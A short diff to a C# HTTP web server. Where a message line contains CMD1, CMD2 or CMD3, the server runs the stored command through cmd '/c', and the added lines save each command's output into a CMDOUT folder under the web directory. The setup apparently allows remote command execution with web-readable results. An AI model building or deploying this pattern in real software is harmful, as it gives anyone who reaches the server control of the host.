@@ -206,6 +206,7 @@ namespace HTTP_Web_Server
                     Console.WriteLine("Command is " + CMD1);
                     CMD1_Output =  CMDCOM("/c" + CMD1);
                     Console.WriteLine(CMD1_Output);
+                    log(WEB_DIR + @"\\CMDOUT\\CMD1_Output.txt", CMD1_Output);
                 }
 
                 if (GetLine(msg, 6).Contains("CMD2"))
@@ -213,6 +214,7 @@ namespace HTTP_Web_Server
                     Console.WriteLine("Command is " + CMD2);
                     CMD2_Output = CMDCOM("/c" + CMD2);
                     Console.WriteLine(CMD2_Output);
+                    log( WEB_DIR + @"\\CMDOUT\\CMD2_Output.txt", CMD2_Output);
                 }
 
                 if (GetLine(msg, 6).Contains("CMD3"))
@@ -220,8 +222,9 @@ namespace HTTP_Web_Server
                     Console.WriteLine("Command is " + CMD3);
                     CMD3_output =  CMDCOM("/c" + CMD3);
                     Console.WriteLine(CMD3_output);
+                    log(WEB_DIR + "\\CMDOUT\\CMD3_Output.txt", CMD3_output);
 
-                    
+
                 }
             }
             else
